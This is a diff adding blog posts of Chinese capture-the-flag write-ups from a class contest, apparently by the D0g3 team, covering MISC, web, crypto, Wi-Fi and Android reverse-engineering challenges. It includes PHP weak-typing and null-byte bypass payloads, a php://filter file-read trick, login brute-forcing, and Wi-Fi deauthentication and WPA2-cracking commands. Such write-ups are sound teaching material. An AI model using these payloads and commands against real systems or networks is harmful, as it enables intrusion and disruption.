@@ -152,6 +152,291 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-班级对抗赛_MISC_WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="热身upup"><a href="#热身upup" class="headerlink" title="热身upup"></a>热身upup</h1><h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><p>摩斯电码，听得出来可以直接翻译，但是乐感较差的可以用音频编辑软件打开，例如AU，即可看到明显的分段</p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>D0g3{UUUTUTUUT}</p>
+<p>#芬奇的日记</p>
+<h2 id="链接-https-pan-baidu-com-s-1eSJAWWM-密码-ju3h"><a href="#链接-https-pan-baidu-com-s-1eSJAWWM-密码-ju3h" class="headerlink" title="链接: https://pan.baidu.com/s/1eSJAWWM 密码: ju3h"></a>链接: <a href="https://pan.baidu.com/s/1eSJAWWM" target="_blank" rel="external">https://pan.baidu.com/s/1eSJAWWM</a> 密码: ju3h</h2><h2 id="题目类型：misc"><a href="#题目类型：misc" class="headerlink" title="题目类型：misc"></a>题目类型：misc</h2><h2 id="考察：图种，二维码反色，base64解密解法"><a href="#考察：图种，二维码反色，base64解密解法" class="headerlink" title="考察：图种，二维码反色，base64解密解法"></a>考察：图种，二维码反色，base64解密<strong>解法</strong></h2><p>丢在binwalk中跑，发现图中还有另一个图，分离出来，二维码反色，扫了之后得到字符串，base64解密</p>
+<p>flag：<code>D0g3{Y0u _4re_c0Oi!}</code></p>
+<h1 id="0x04-来自佛的一封信-by-C1em0"><a href="#0x04-来自佛的一封信-by-C1em0" class="headerlink" title="0x04 来自佛的一封信  by C1em0"></a>0x04 来自佛的一封信  by C1em0</h1><ol>
+<li>题目名：《来自佛的一封信》</li>
+<li>考察内容：源码查看习惯，百度能力，base64编码</li>
+<li>payload:在注释中找到密文，百度题目关键字就能在线解密。</li>
+</ol>
+<h1 id="0x05-留图不留种-by-zev3n"><a href="#0x05-留图不留种-by-zev3n" class="headerlink" title="0x05 留图不留种  by zev3n"></a>0x05 留图不留种  by zev3n</h1><ul>
+<li><h3 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h3><a href="http://pan.baidu.com/s/1pLNv33H" target="_blank" rel="external">http://pan.baidu.com/s/1pLNv33H</a></li>
+<li><h3 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h3>zip伪加密，图种，二维码</li>
+<li><h3 id="考察知识点-1"><a href="#考察知识点-1" class="headerlink" title="考察知识点"></a>考察知识点</h3>1.binwalk或winhex的使用<br>2.图种的解压<br>3.二维码两种定位点的作用<br>4.二维码的纠错功能</li>
+<li><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3>1.winhex修改标记破解伪加密或者直接拿进Linux系统解压出图种<br>2.binwalk -e分解或者直接修改文件后缀名得到隐藏压缩包<br>3.得到两张不完整的二维码图片<br>4.观察二维码缺失定位点（以及辅助定位点），再观察图片中心有一个定位点样式区域<br>5.复制中心区域到三个角，再拼接上辅助定位点，扫描得到flag</li>
+</ul>
+<h1 id="0x05-RRRSA-by-w1mps"><a href="#0x05-RRRSA-by-w1mps" class="headerlink" title="0x05 RRRSA  by w1mps"></a>0x05 RRRSA  by w1mps</h1><p>rsa.txt<br>n的一个因数比较小，很容易跑出来p和q，求出d就解出来了，为了提示他们暴力跑。。另外一个因数其实也没给很大，不写脚本其实也可以出，比如可以去<a href="http://factordb.com/求解" target="_blank" rel="external">http://factordb.com/求解</a> </p>
+<p>解密脚本：</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding: utf-8"></a>coding: utf-8</h1><p>  c = [‘231209168460534368’,<br>      ‘653775369641132514’,<br>      ‘572992224772813854’,<br>      ‘24661130601438802’,<br>      ‘207970797586895508’,<br>      ‘7420374200071926’,<br>      ‘220033179808126041’,<br>      ‘690428728542718718’,<br>      ‘522803131162521381’,<br>      ‘108831082199640865’,<br>      ‘209002588024035867’,<br>      ‘690428728542718718’,<br>      ‘86875381817289627’,<br>      ‘86875381817289627’,<br>      ‘86875381817289627’,<br>      ‘576873037271561711’,<br>      ‘185467894761485820’]<br>  n = 696074725189933717<br>  e = 65537</p>
+<h1 id="n很小，猜解其中一个因数很小"><a href="#n很小，猜解其中一个因数很小" class="headerlink" title="n很小，猜解其中一个因数很小"></a>n很小，猜解其中一个因数很小</h1><p>  def pq():<br>      for p in xrange(2, 100):<br>          if (n % p == 0):<br>              return p</p>
+<p>  def fast_mod(b, e, m):<br>      result = 1<br>      while e != 0:<br>          if (e&amp;1) == 1:</p>
+<pre><code>        # ei = 1, then mul
+
+        result = (result * b) % m
+    e &gt;&gt;= 1
+    # b, b^2, b^4, b^8, ... , b^(2^n)
+    b = (b*b) % m
+return result
+</code></pre><p>  def extendedGCD(a, b):<br>      if b == 0:<br>          return (1, 0, a)<br>      x1 = 1<br>      y1 = 0<br>      x2 = 0<br>      y2 = 1<br>      while b != 0:<br>          q = a / b<br>          r = a % b<br>          a = b<br>          b = r<br>          x = x1 - q<em>x2<br>          x1 = x2<br>          x2 = x<br>          y = y1 - q</em>y2<br>          y1 = y2<br>          y2 = y<br>      return(x1, y1, a)</p>
+<p>  def computeD(fn, e):<br>      (x, y, r) = extendedGCD(fn, e)</p>
+<pre><code>#y maybe &lt; 0, so convert it
+if y &lt; 0:
+    return fn + y
+return y
+</code></pre><p>  if <strong>name</strong> == ‘<strong>main</strong>‘:<br>      print ‘n=’ + str(n)<br>      print ‘e=’ + str(e)<br>      p = pq()<br>      q = n / pq()<br>      print ‘p=’+str(p)<br>      print “q=”+str(q)<br>      fn = (q-1)*(p-1)<br>      d = computeD(fn, e)<br>      print ‘d=’ + str(d)<br>      for i in c:<br>          c = int(i)<br>          m1=fast_mod(c,d,n)<br>          print ‘解密:’+str(m1)+”     %s” % ((“%x” % m1).decode(“hex”))</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/01j4epe30xxn79hqs0vujgbwhr.png" alt=""><br><img src="http://ovc0f0a85.bkt.clouddn.com/a211szfgpkyjsmc887nyxldgkq.png" alt=""></p>
+<h1 id="0x06-crypt-by-drac0nids"><a href="#0x06-crypt-by-drac0nids" class="headerlink" title="0x06 crypt  by drac0nids"></a>0x06 crypt  by drac0nids</h1><p>第一关给了一串二位数<br>二位数第一位代表手机键盘对应的位置<br>第二位数字代表第几个字母<br>得到密码为zhimakaimen<br>进入第二关<br>哈夫曼树<br>将叶子位置的节点先ascii转字符<br>然后按照哈夫曼编码排出先后顺序</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/11/26/班级对抗赛_MISC_WriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-班级对抗赛_Pr_WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-简单代码审计（送分）by-Ph0rse"><a href="#0x01-简单代码审计（送分）by-Ph0rse" class="headerlink" title="0x01 简单代码审计（送分）by  Ph0rse"></a>0x01 简单代码审计（送分）by  Ph0rse</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="http://45.32.90.22:2501/index.php" target="_blank" rel="external">http://45.32.90.22:2501/index.php</a></p>
+<h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><p>代码审计，PHP弱类型</p>
+<h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><p>1、Base64解密<br>2、变量覆盖<br>3、md5弱类型相等<br>4、md5数组加密漏洞</p>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="http://45.32.90.22:2501/index.php?name=xiaohong&amp;sex=nv&amp;key=240610708&amp;pen[]=1&amp;apple[]=2" target="_blank" rel="external">http://45.32.90.22:2501/index.php?name=xiaohong&amp;sex=nv&amp;key=240610708&amp;pen[]=1&amp;apple[]=2</a></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>D0G3{BAC0N_IS_TASTY!}</p>
+<h1 id="0x02-Myblog-Typecho——EXP-by-Ph0rse"><a href="#0x02-Myblog-Typecho——EXP-by-Ph0rse" class="headerlink" title="0x02 Myblog  Typecho——EXP   by   Ph0rse"></a>0x02 Myblog  Typecho——EXP   by   Ph0rse</h1><h2 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h2><p><a href="http://45.32.90.22:2502/" target="_blank" rel="external">http://45.32.90.22:2502/</a><br>数据库密码为空，但限制了只有本地IP可以访问<br>后台管理员账号密码为D0g233333</p>
+<h2 id="考察知识点-1"><a href="#考察知识点-1" class="headerlink" title="考察知识点"></a>考察知识点</h2><p>快速锁定版本号，搜索exp，getshell<br>反序列化<br>快速代码审计</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><a href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/" target="_blank" rel="external">http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/</a></p>
+<h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h2><p>D0g3{th1s_here_hihihi}</p>
+<h1 id="0x03-secret-code-by-Sn00py"><a href="#0x03-secret-code-by-Sn00py" class="headerlink" title="0x03 secret code  by  Sn00py"></a>0x03 secret code  by  Sn00py</h1><h2 id="考察知识点-2"><a href="#考察知识点-2" class="headerlink" title="考察知识点"></a>考察知识点</h2><p>1.php源码加密</p>
+<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h2><p><a href="http://222.18.158.244:4141/" target="_blank" rel="external">http://222.18.158.244:4141/</a> post:debug=1&amp;file=flag.php<br>burpsuite下拷贝加密源码到flag.php,包含flag.php,输出全局变量.</p>
+<h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h2><p>D0g3{hava_fun!!!!!!}</p>
+<h1 id="0x05-血红的双眼-by-C1em0"><a href="#0x05-血红的双眼-by-C1em0" class="headerlink" title="0x05 血红的双眼 by C1em0"></a>0x05 血红的双眼 by C1em0</h1><h2 id="题目名"><a href="#题目名" class="headerlink" title="题目名"></a>题目名</h2><p>《血红的双眼》 by C1em0</p>
+<h2 id="考察内容"><a href="#考察内容" class="headerlink" title="考察内容"></a>考察内容</h2><p>sql布尔盲注，过滤绕过，python脚本编写，bp使用。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>根据测出的过滤处进行编写脚本或者用bp跑就行，python脚本注意编码问题。</p>
+<h1 id="0x06-WEB-64号基地-by-zev3n"><a href="#0x06-WEB-64号基地-by-zev3n" class="headerlink" title="0x06 WEB-64号基地  by zev3n"></a>0x06 WEB-64号基地  by zev3n</h1><h2 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h2><p>还没传到服务器。。。</p>
+<h2 id="题目类型-1"><a href="#题目类型-1" class="headerlink" title="题目类型"></a>题目类型</h2><p>文件包含导致的任意文件读取</p>
+<h2 id="考察知识点-3"><a href="#考察知识点-3" class="headerlink" title="考察知识点"></a>考察知识点</h2><p>1.php伪协议<br>2.伪协议中filter过滤器的常见种类</p>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.点开页面中的链接，得到file参数的提示，应该想到文件包含<br>2.尝试用php://filter/read=<strong>convert.base64-encode</strong>/resourse=index.php读取出本页面的源码<br>3.读出“源码”的base64，解密后发现没有想象中那么简单<br>4.使用<strong>string.rot13</strong>过滤器重新读取，解密后得到flag</p>
+<h1 id="0x07-What-remains-of-Bruce-Finch-by-Skye"><a href="#0x07-What-remains-of-Bruce-Finch-by-Skye" class="headerlink" title="0x07 What remains of Bruce Finch  by Skye"></a>0x07 What remains of Bruce Finch  by Skye</h1><h2 id="链接：http-222-18-158-244-4151"><a href="#链接：http-222-18-158-244-4151" class="headerlink" title="链接：http://222.18.158.244:4151/"></a>链接：<a href="http://222.18.158.244:4151/" target="_blank" rel="external">http://222.18.158.244:4151/</a></h2><h2 id="题目类型：web"><a href="#题目类型：web" class="headerlink" title="题目类型：web"></a>题目类型：web</h2><h2 id="考察：暴力破解，两次加密处理，firebug使用（删除节点）"><a href="#考察：暴力破解，两次加密处理，firebug使用（删除节点）" class="headerlink" title="考察：暴力破解，两次加密处理，firebug使用（删除节点）"></a>考察：暴力破解，两次加密处理，firebug使用（删除节点）</h2><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>firebug中删除节点，将干扰字幕除去，进入表单，用burpsuite对用户名和密码进行爆破，用户名根据提示中的四个名字。用户名是Edith，密码123321，用burp的时候又MD5和base64加密。<br>flag：Dog3{Brut3_f0rc3_50_e45y}</p>
+<h1 id="0x08-计算题-by-We2sWing"><a href="#0x08-计算题-by-We2sWing" class="headerlink" title="0x08 计算题 by We2sWing"></a>0x08 计算题 by We2sWing</h1><p>浏览器F12看源码 改长度  得到base64加密和url加密的字符串  解密一次即可</p>
+<h1 id="0x09-加0题-by-We2sWing"><a href="#0x09-加0题-by-We2sWing" class="headerlink" title="0x09 加0题 by We2sWing"></a>0x09 加0题 by We2sWing</h1><p>robot.txt 直接在网页后面加一个robot.txt 进去就能看源码 在根据源码 去url编码字符串</p>
+<h1 id="0x09-Love-China-by-汪子豪"><a href="#0x09-Love-China-by-汪子豪" class="headerlink" title="0x09 Love China  by 汪子豪"></a>0x09 Love China  by 汪子豪</h1><p>JavaScript操作题 在浏览器控制台让clicks大于1000000就行（也可以使用POST提交） </p>
+<h1 id="0x0a-php反序列化-by-汪子豪"><a href="#0x0a-php反序列化-by-汪子豪" class="headerlink" title="0x0a php反序列化 by 汪子豪"></a>0x0a php反序列化 by 汪子豪</h1><p>PHP反序列化，给提示:hint<br>登录没反应，提示:GET一个hint就有源代码<br> 审计代码，要传一个cookie名为D0g3的反序列值。并且反序列后的值要全等于$KEY<br>注意这里穿进去的是空，即<br>payload<br>Cookie: s:0:””;</p>
+<h1 id="0x0b-web1-by-drac0nids"><a href="#0x0b-web1-by-drac0nids" class="headerlink" title="0x0b web1: by drac0nids"></a>0x0b web1: by drac0nids</h1><p>直接post一个超全局变量GLOBALS</p>
+<h1 id="0X0C-web2-by-drac0nids"><a href="#0X0C-web2-by-drac0nids" class="headerlink" title="0X0C web2: by drac0nids"></a>0X0C web2: by drac0nids</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">echo</span>    <span class="string">"&lt;!--index.phps--&gt;"</span>;</div><div class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hahahaha"</span>;</div><div class="line">&#125;</div><div class="line">$id=$_GET[<span class="string">'id'</span>];</div><div class="line">$a=$_GET[<span class="string">'a'</span>];</div><div class="line">$b=$_GET[<span class="string">'b'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'23333'</span>;</div><div class="line">    <span class="keyword">return</span> ;</div><div class="line">&#125;</div><div class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</div><div class="line"><span class="keyword">if</span>($data==<span class="string">"I want to join D0g3"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> strlen($b&lt;<span class="number">7</span>) <span class="keyword">and</span> eregi($b,<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>一道代码审计题<br>梳理一下得到flag的条件：<br>第一个if出id不能等于0，若id等于0，那么!$_GET[‘id’]==1，就会进入if语句内部，然后会跳转但后面有要求id==0,当传入id等于一个英文字母时，由于php的弱类型，会将字母转化为0在进行比较，因此，我们可以使id=a来绕过</p>
+<p>由后面a在file_get_contents中可以知道，a应该传入一个文件名，data读取a文件的内容后为”I want to join D0g3”,此处利用file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入，因此将a设为php://input,然后post我们想要输入a中的内容就可以了</p>
+<p>使用eregi进行正则匹配时，只要第一个参数是第二个参数的子串就会匹配成功，返回true，在php中%00会对eregi()函数进行截断，但不会对strlen()函数进行截断，而且b的长度我做了限制只能为6位，因此，我们使用%00来构造截断绕过限制b=1%0012345，strlen不会ba%00算在字符长度里面   </p>
+<h1 id="0x0d-绝对找不到的D0g3-by-TimeS0ng"><a href="#0x0d-绝对找不到的D0g3-by-TimeS0ng" class="headerlink" title="0x0d 绝对找不到的D0g3 by TimeS0ng"></a>0x0d 绝对找不到的D0g3 by TimeS0ng</h1><p>Wireshark抓包分析，ftp基于明文传输账号密码<br>payload:利用Wireshark过滤ftp数据包</p>
+<h1 id="0x0e-还能找到算我输-by-TimeS0ng"><a href="#0x0e-还能找到算我输-by-TimeS0ng" class="headerlink" title="0x0e 还能找到算我输   by TimeS0ng"></a>0x0e 还能找到算我输   by TimeS0ng</h1><p>考察内容：aircrack-ng破解WPA2握手包密码，airdecap-ng还原802.11数据包<br>Tips1:数据包里有握手包  Tips2:flag以D0g3{IP_xxxx}形式提交我的内网IP</p>
+<blockquote>
+<p>aircrack-ng -w common.txt wpa2-01.cap<br>airdecap-ng D0g3-1.cap -e TimeS0ng -p password -b E4:F3:F5:2D:55:A8<br>airmon-ng start wlan0;iwconfig</p>
+</blockquote>
+<p>airodump-ng wlan0mon</p>
+<p>airodump-ng wlan0mon -c 1 –essid TimeS0ng -w wpa2</p>
+<p>aireplay-ng wlan0mon -0 3 -a E4:F3:F5:2D:55:A8  -c 98:01:a7:c5:f7:6d</p>
+<p>aircrack-ng -w common.txt wpa2-01.cap</p>
+<p>airdecap-ng wpa2-01.cap -e TimeS0ng -p password -b E4:F3:F5:2D:55:A8</p>
+<h1 id="0x0f-Amazing-magic-by-w1mps"><a href="#0x0f-Amazing-magic-by-w1mps" class="headerlink" title="0x0f Amazing magic    by w1mps"></a>0x0f Amazing magic    by w1mps</h1><p>提示post个key，源码里提示post个source过来，然后给出了源码，审一下，ban了1到9，但是0可以用，利用0x绕过就可以了<br>payload: key=0xdec0de</p>
+<p>Flag:D0g3{mmmmmagic!?!}</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/11/26/班级对抗赛_Pr_WriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-班级对抗赛_Re_WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Easy-RE"><a href="#Easy-RE" class="headerlink" title="Easy_RE"></a>Easy_RE</h2><p>直接在od里搜到字符串，base64解码。<br><br>flag:D0g3{Re_1s_v3ry_ea5y!}</p>
+<h2 id="爱情的力量"><a href="#爱情的力量" class="headerlink" title="爱情的力量"></a>爱情的力量</h2><h3 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h3><blockquote>
+<p>这是给班级对抗赛出的题目…</p>
+</blockquote>
+<p>所有文件的链接：<a href="http://pan.baidu.com/s/1geZ69pT" target="_blank" rel="external">http://pan.baidu.com/s/1geZ69pT</a> 密码：z19x<br>首先是自己写的app，app对应的安卓的版本号是</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-9945f311541ad26b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="android-4.0.3.png"></p>
+<p>其实就是一个简单的登录题，所以源码也是比较简单的。使用android studio，这里我们可以使用自己使用design界面来设计自己的界面，也可以直接手敲代码来设计自己的界面。</p>
+<p>设计界面design的窗口是在app/res/layout/activity_main.xml中,觉得还是这个设计窗口很人性化，我很喜欢，代码太多不愿意手敲…</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-000a35cda09e9e87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="activity_main.xml.png"></p>
+<p>当然我们也可以手敲代码(从来就没有手敲代码不能解决的事情，如果有，那就多敲两行)，也就是在acivity_mian.xml的text界面下…附上一部分的代码，具体代码已上传在压缩包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class="line">&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</div><div class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</div><div class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</div><div class="line">    android:layout_width=&quot;match_parent&quot;</div><div class="line">    android:layout_height=&quot;match_parent&quot;</div><div class="line">    tools:context=&quot;spring.com.i_love_dog3.MainActivity&quot;&gt;//这里是你的包名和你的类名，自己做修改...</div><div class="line">    &lt;TextView</div><div class="line">        android:id=&quot;@+id/textView&quot;</div><div class="line">        android:layout_width=&quot;wrap_content&quot;</div><div class="line">        android:layout_height=&quot;wrap_content&quot;</div><div class="line">        android:text=&quot;name :&quot;</div><div class="line">        android:textAppearance=&quot;@style/TextAppearance.AppCompat.Headline&quot;</div><div class="line">        app:layout_constraintRight_toLeftOf=&quot;@+id/editText&quot; //这是输入数据的横线的控件</div><div class="line">        tools:layout_constraintRight_creator=&quot;1&quot;</div><div class="line">        tools:layout_constraintBottom_creator=&quot;1&quot;</div><div class="line">        app:layout_constraintBottom_toBottomOf=&quot;@+id/editText&quot;//这里命名为editText</div><div class="line">        android:layout_marginEnd=&quot;9dp&quot;//这里是相对的位置，下</div><div class="line">        android:layout_marginRight=&quot;9dp&quot; /&gt;//右</div></pre></td></tr></table></figure></p>
+<p>对于做界面设计的时候，这里做一个提醒，自己制作的过程中一定要定义相对位置啊，别到时候出来的效果是所有的控件全都挤在一块地方，定义相对位置的地方在这：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/8203438-6fc578cc05fb120c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="inter-Constrains"></p>
+<p>最后附上设计主类的代码：（这里面的算法，也就不解释了，百度云链接里面有个cpp文件，可以自己看…）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">package spring.com.i_love_dog3;</div><div class="line"></div><div class="line">import android.support.v7.app.AppCompatActivity;</div><div class="line">import android.os.Bundle;</div><div class="line">import android.view.View;//上面两个是默认的包，下面这四个是自己要附加上的包，因为我们需要这些控件所对应的函数</div><div class="line">import android.widget.Button;</div><div class="line">import android.widget.EditText;</div><div class="line">import android.widget.Toast;</div><div class="line"></div><div class="line">public class MainActivity extends AppCompatActivity &#123;</div><div class="line"></div><div class="line">    EditText Name; //定义Plain Test控件第一个输入框的名字</div><div class="line">    EditText Pass; //定义Plain Test控件第二个输入框的名字</div><div class="line">    @Override</div><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        Name = (EditText) findViewById(R.id.editText);</div><div class="line">        Pass = (EditText) findViewById(R.id.editText2);</div><div class="line">        Button Login = (Button) findViewById(R.id.button);</div><div class="line">        Login.setOnClickListener(new View.OnClickListener() &#123; //监听有没有点击按钮控件 如果点击了就会执行onClick函数</div><div class="line">            @Override</div><div class="line">            public void onClick(View view) &#123;</div><div class="line">                I_love_d0g3(Name.getText().toString().trim(),Pass.getText().toString().trim());</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">    public void do_you_love_d0g3(String name,String pass)</div><div class="line">    &#123;</div><div class="line">        if(name.equals(&quot;2`m1wf`e1h4&quot;)&amp;&amp;pass.equals(&quot;c/f2^0r^`^f//c^sd`l&quot;))</div><div class="line">        &#123;</div><div class="line">            Toast.makeText(MainActivity.this,&quot;谢谢你的喜欢，我们会做的更好的&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">            Toast.makeText(MainActivity.this,&quot;你不爱我了，连账号密码都忘了&quot;, Toast.LENGTH_SHORT).show();</div><div class="line">    &#125;</div><div class="line">    public void I_love_d0g3(String name,String pass)</div><div class="line">    &#123;</div><div class="line">        int namelen = name.length();</div><div class="line">        int passlen = pass.length();s</div><div class="line">        char[] name1 = name.toCharArray();</div><div class="line">        char[] pass1 = pass.toCharArray();</div><div class="line">        for(int i=0;i&lt;namelen;i++)</div><div class="line">        &#123;</div><div class="line">            name1[i]+=1;</div><div class="line">        &#125;</div><div class="line">        for(int j=0;j&lt;passlen;j++)</div><div class="line">        &#123;</div><div class="line">            pass1[j]-=1;</div><div class="line">        &#125;</div><div class="line">        do_you_love_d0g3(String.valueOf(name1),String.valueOf(pass1));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="解题的思路"><a href="#解题的思路" class="headerlink" title="解题的思路"></a>解题的思路</h3><p>解法就是反编译出这个apk就OK，我主要是用两个软件，一种是安卓改之理（增强少月版），还有一个是android killer，感觉最好用的还是改之理，改之理快而且好，但是有一个问题就是反编译出的java源码中会出现一些错位…尤其是for循环和if判断语句，所以脑洞要大;但是 我的android killer跑不了这道题目（它一直在反编译，编译了很久都没有编译出来），以前我用eclipse开发的app，是可以反编译出app的，但是这个用android studio（我第一次用这种集成开发工具）。<br>下面是使用apk改之理的解法：<br>打开，反编译…</p>
